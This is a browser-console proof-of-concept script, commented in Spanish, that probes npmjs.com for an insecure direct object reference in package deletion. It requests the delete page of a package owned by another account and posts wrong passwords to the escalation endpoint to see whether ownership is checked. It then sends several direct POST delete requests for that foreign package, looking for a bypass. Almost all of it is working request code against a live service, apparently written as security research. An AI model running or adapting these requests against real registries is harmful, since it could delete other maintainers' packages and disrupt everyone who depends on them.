// ================================================================
// PoC: IDOR en escalación de eliminación de paquetes
// ================================================================
// HALLAZGO PREVIO: /package/{cualquier-paquete}/delete devuelve
// HTTP 200 con formulario de escalación incluso para paquetes ajenos.
//
// PRUEBA: Enviar contraseña INCORRECTA a /escalate con originalUrl
// apuntando a un paquete ajeno. Si el error es "wrong password"
// (y NO "you don't own this package"), confirma que NO hay
// verificación de ownership en el flujo de escalación.
//
// EJECUTAR EN: https://www.npmjs.com (sesión autenticada como owellandry)
// ================================================================

console.log("=== PoC: Escalación IDOR - Verificación de Ownership ===\n");

const spiferackHeaders = {
    'x-spiferack': '1',
    'x-requested-with': 'XMLHttpRequest',
    'manifest-hash': window.__context__?.hash || ''
};
const csrftoken = window.__context__?.csrftoken ||
                  window.__context__?.context?.csrftoken || '';
const myUser = window.__context__?.user?.name ||
               window.__context__?.context?.user?.name || 'unknown';

console.log(`[*] Usuario actual: ${myUser}`);
console.log(`[*] CSRF token: ${csrftoken ? csrftoken.substring(0, 15) + '...' : 'NO ENCONTRADO'}\n`);

async function sPost(path, body = {}, extraHeaders = {}) {
    const res = await fetch(path, {
        method: 'POST',
        headers: {
            ...spiferackHeaders,
            'content-type': 'application/json',
            'x-csrf-token': csrftoken,
            ...extraHeaders
        },
        credentials: 'include',
        body: JSON.stringify(body)
    });
    const ct = res.headers.get('content-type') || '';
    let data;
    try {
        data = ct.includes('json') ? await res.json() : await res.text();
    } catch(e) {
        data = null;
    }
    return {
        status: res.status,
        data,
        headers: Object.fromEntries([...res.headers.entries()])
    };
}

async function sGet(path) {
    const res = await fetch(path, { headers: spiferackHeaders, credentials: 'include' });
    const ct = res.headers.get('content-type') || '';
    return {
        status: res.status,
        data: res.ok && ct.includes('json') ? await res.json() : null,
        headers: Object.fromEntries([...res.headers.entries()])
    };
}

(async () => {

    // ================================================================
    // PASO 1: Obtener la página de delete del paquete AJENO
    // para confirmar que recibimos el formulario de escalación
    // ================================================================
    console.log("═══════════════════════════════════════════");
    console.log("  PASO 1: Confirmar acceso a delete de paquete ajeno");
    console.log("═══════════════════════════════════════════\n");

    // Paquete ajeno según la cuenta logueada
    const targetPkg = myUser === 'owellandry' ? 'openvite' : '@connextjs/cli';
    const targetOwner = myUser === 'owellandry' ? 'andrysilva' : 'owellandry';

    console.log(`[*] Logueado como: ${myUser}`);
    console.log(`[*] Paquete objetivo: ${targetPkg} (dueño: ${targetOwner})`);

    // GET la página de delete
    const deletePageGet = await sGet(`/package/${targetPkg}/delete`);
    console.log(`\nGET /package/${targetPkg}/delete → HTTP ${deletePageGet.status}`);

    if (!deletePageGet.data) {
        console.log("[-] No se pudo obtener la página de delete. Abortando.");
        return;
    }

    console.log(`[+] Respuesta recibida. Keys: ${Object.keys(deletePageGet.data).join(', ')}`);

    // Extraer datos de escalación
    const escalateType = deletePageGet.data.escalateType;
    const action = deletePageGet.data.action;
    const originalUrl = deletePageGet.data.originalUrl;
    const pageCsrf = deletePageGet.data.csrftoken || csrftoken;

    console.log(`    escalateType: ${escalateType}`);
    console.log(`    action: ${action}`);
    console.log(`    originalUrl: ${originalUrl}`);
    console.log(`    user en respuesta: ${deletePageGet.data.user?.name || 'N/A'}`);

    if (escalateType !== 'password') {
        console.log(`\n[!] escalateType no es 'password', es: ${escalateType}`);
        console.log("[!] Podría requerir 2FA u otro método. Investigar manualmente.");
    }


    // ================================================================
    // PASO 2: Enviar POST a /escalate con contraseña INCORRECTA
    // Si responde "wrong password" → NO verifica ownership
    // Si responde "unauthorized" o "forbidden" → SÍ verifica ownership
    // ================================================================
    console.log("\n═══════════════════════════════════════════");
    console.log("  PASO 2: POST /escalate con contraseña INCORRECTA");
    console.log("═══════════════════════════════════════════\n");

    console.log("[*] Enviando contraseña incorrecta ('wrongpassword123') a /escalate");
    console.log(`[*] Con originalUrl: ${originalUrl}`);
    console.log(`[*] Esto NO eliminará nada - solo verifica si el servidor`);
    console.log(`    chequea ownership ANTES de validar la contraseña.\n`);

    // Probar diferentes formatos del body
    const escalateVariants = [
        {
            name: "Formato 1: password + originalUrl",
            body: {
                csrftoken: pageCsrf,
                password: 'wrongpassword123',
                originalUrl: originalUrl
            }
        },
        {
            name: "Formato 2: password + action",
            body: {
                csrftoken: pageCsrf,
                password: 'wrongpassword123',
                action: originalUrl
            }
        },
        {
            name: "Formato 3: escalateValue + originalUrl",
            body: {
                csrftoken: pageCsrf,
                escalateValue: 'wrongpassword123',
                originalUrl: originalUrl
            }
        }
    ];

    for (const variant of escalateVariants) {
        console.log(`\n--- ${variant.name} ---`);
        console.log(`POST ${action || '/escalate'}`);
        console.log(`Body: ${JSON.stringify(variant.body).replace(/wrongpassword123/g, '***')}`);

        const r = await sPost(action || '/escalate', variant.body);
        console.log(`→ HTTP ${r.status}`);

        if (typeof r.data === 'string') {
            // Respuesta texto - buscar pistas
            const text = r.data.substring(0, 500);
            console.log(`Respuesta (texto): ${text}`);

            // Buscar indicadores
            if (r.data.toLowerCase().includes('password') && !r.data.toLowerCase().includes('permission')) {
                console.log(`\n[!!!] RESPUESTA MENCIONA PASSWORD SIN MENCIONAR PERMISOS`);
                console.log(`[!!!] ESTO SUGIERE QUE NO VERIFICA OWNERSHIP`);
            }
            if (r.data.toLowerCase().includes('unauthorized') || r.data.toLowerCase().includes('forbidden') || r.data.toLowerCase().includes('not allowed') || r.data.toLowerCase().includes('permission')) {
                console.log(`\n[*] Respuesta menciona permisos/autorización`);
                console.log(`[*] El servidor PODRÍA estar verificando ownership`);
            }
        } else if (r.data && typeof r.data === 'object') {
            console.log(`Respuesta (JSON): ${JSON.stringify(r.data).substring(0, 500)}`);

            // Analizar la respuesta JSON
            const full = JSON.stringify(r.data).toLowerCase();

            if (full.includes('password') || full.includes('incorrect') || full.includes('wrong') || full.includes('invalid')) {
                console.log(`\n[!!!] RESPUESTA INDICA ERROR DE CONTRASEÑA`);
                if (!full.includes('permission') && !full.includes('forbidden') && !full.includes('unauthorized') && !full.includes('not allowed') && !full.includes('owner')) {
                    console.log(`[!!!] SIN MENCIÓN DE PERMISOS/OWNERSHIP`);
                    console.log(`[!!!] CONFIRMA: El servidor NO verifica ownership en /escalate`);
                    console.log(`[!!!] VULNERABILIDAD IDOR CONFIRMADA`);
                }
            }

            if (full.includes('escalate') || full.includes('originalurl')) {
                console.log(`[*] Respuesta contiene campos de escalación - el flujo continúa`);
            }

            // Mostrar todas las keys
            if (typeof r.data === 'object') {
                console.log(`Keys: ${Object.keys(r.data).join(', ')}`);
                for (const [k, v] of Object.entries(r.data)) {
                    const val = JSON.stringify(v);
                    console.log(`  ${k}: ${val.substring(0, 200)}`);
                }
            }
        }
    }


    // ================================================================
    // PASO 3: También probar POST directo a /package/{pkg}/delete
    // sin pasar por escalación, por si hay un bypass
    // ================================================================
    console.log("\n\n═══════════════════════════════════════════");
    console.log("  PASO 3: POST directo a /package/{pkg}/delete");
    console.log("═══════════════════════════════════════════\n");

    const directDeleteVariants = [
        {
            name: "POST con packageName",
            url: `/package/${targetPkg}/delete`,
            body: { csrftoken: pageCsrf, packageName: targetPkg }
        },
        {
            name: "POST con confirm = nombre del paquete",
            url: `/package/${targetPkg}/delete`,
            body: { csrftoken: pageCsrf, confirm: targetPkg, packageName: targetPkg }
        },
        {
            name: "POST con package (encoded)",
            url: `/package/${encodeURIComponent(targetPkg)}/delete`,
            body: { csrftoken: pageCsrf, package: targetPkg }
        }
    ];

    for (const variant of directDeleteVariants) {
        console.log(`\n--- ${variant.name} ---`);
        console.log(`POST ${variant.url}`);

        const r = await sPost(variant.url, variant.body);
        console.log(`→ HTTP ${r.status}`);

        if (typeof r.data === 'string') {
            console.log(`Respuesta: ${r.data.substring(0, 400)}`);
        } else if (r.data) {
            console.log(`Respuesta: ${JSON.stringify(r.data).substring(0, 400)}`);
            if (typeof r.data === 'object') {
                console.log(`Keys: ${Object.keys(r.data).join(', ')}`);
            }
        }

        // Si el status es 200, es PREOCUPANTE
        if (r.status === 200) {
            const full = JSON.stringify(r.data || '').toLowerCase();
            if (full.includes('escalate')) {
                console.log(`[*] Redirige a escalación - requiere contraseña primero`);
            } else if (full.includes('success') || full.includes('deleted') || full.includes('removed')) {
                console.log(`[!!!] POSIBLE ELIMINACIÓN EXITOSA SIN ESCALACIÓN`);
            }
        }
    }


    // ================================================================
    // PASO 4: Comparar respuesta de delete PROPIO vs AJENO
    // ================================================================
    console.log("\n\n═══════════════════════════════════════════");
    console.log("  PASO 4: Comparar delete propio vs ajeno");
    console.log("═══════════════════════════════════════════\n");

    // Paquete propio
    const ownPkg = myUser === 'owellandry' ? '@connextjs/cli' : 'openvite';

    const ownDelete = await sGet(`/package/${ownPkg}/delete`);
    const foreignDelete = await sGet(`/package/${targetPkg}/delete`);

    console.log(`Paquete PROPIO (${ownPkg}):`);
    console.log(`  HTTP ${ownDelete.status}`);
    if (ownDelete.data) {
        console.log(`  Keys: ${Object.keys(ownDelete.data).join(', ')}`);
        console.log(`  escalateType: ${ownDelete.data.escalateType}`);
        console.log(`  originalUrl: ${ownDelete.data.originalUrl}`);
        console.log(`  user: ${ownDelete.data.user?.name}`);
    }

    console.log(`\nPaquete AJENO (${targetPkg}):`);
    console.log(`  HTTP ${foreignDelete.status}`);
    if (foreignDelete.data) {
        console.log(`  Keys: ${Object.keys(foreignDelete.data).join(', ')}`);
        console.log(`  escalateType: ${foreignDelete.data.escalateType}`);
        console.log(`  originalUrl: ${foreignDelete.data.originalUrl}`);
        console.log(`  user: ${foreignDelete.data.user?.name}`);
    }

    // Comparar las respuestas
    if (ownDelete.data && foreignDelete.data) {
        const ownKeys = Object.keys(ownDelete.data).sort().join(',');
        const foreignKeys = Object.keys(foreignDelete.data).sort().join(',');

        if (ownKeys === foreignKeys) {
            console.log(`\n[!!!] MISMA ESTRUCTURA para paquete propio y ajeno`);
            console.log(`[!!!] El servidor NO distingue ownership en la página de delete`);
        } else {
            console.log(`\n[*] Estructuras diferentes:`);
            console.log(`  Propio: ${ownKeys}`);
            console.log(`  Ajeno: ${foreignKeys}`);
        }

        // ¿Ambos piden password?
        if (ownDelete.data.escalateType === 'password' && foreignDelete.data.escalateType === 'password') {
            console.log(`[!!!] AMBOS piden contraseña - misma escalación para propio y ajeno`);
        }
    }


    // ================================================================
    // RESUMEN
    // ================================================================
    console.log("\n\n═══════════════════════════════════════════");
    console.log("  RESUMEN");
    console.log("═══════════════════════════════════════════\n");

    console.log(`Usuario: ${myUser}`);
    console.log(`Paquete objetivo (ajeno): ${targetPkg} (dueño: ${targetOwner})`);
    console.log(`\nHallazgos:`);
    console.log(`  1. GET /package/${targetPkg}/delete → HTTP ${deletePageGet.status}`);
    console.log(`     ${deletePageGet.status === 200 ? '[!!!] ACCESO CONCEDIDO a página de delete de paquete ajeno' : '[-] Acceso denegado'}`);
    console.log(`  2. El formulario de escalación pide: ${escalateType || 'desconocido'}`);
    console.log(`  3. action del form: ${action || 'desconocido'}`);
    console.log(`  4. originalUrl: ${originalUrl || 'desconocido'}`);

    console.log(`\n[*] INTERPRETACIÓN:`);
    console.log(`  - El servidor muestra la página de eliminación para CUALQUIER paquete`);
    console.log(`  - Solo pide la contraseña del usuario actual (escalación)`);
    console.log(`  - Si /escalate no verifica ownership, cualquier usuario podría`);
    console.log(`    eliminar cualquier paquete entrando SU PROPIA contraseña`);
    console.log(`  - Esto sería un IDOR CRÍTICO que afecta todo el ecosistema npm`);

    console.log("\n=== FIN ===");
})();
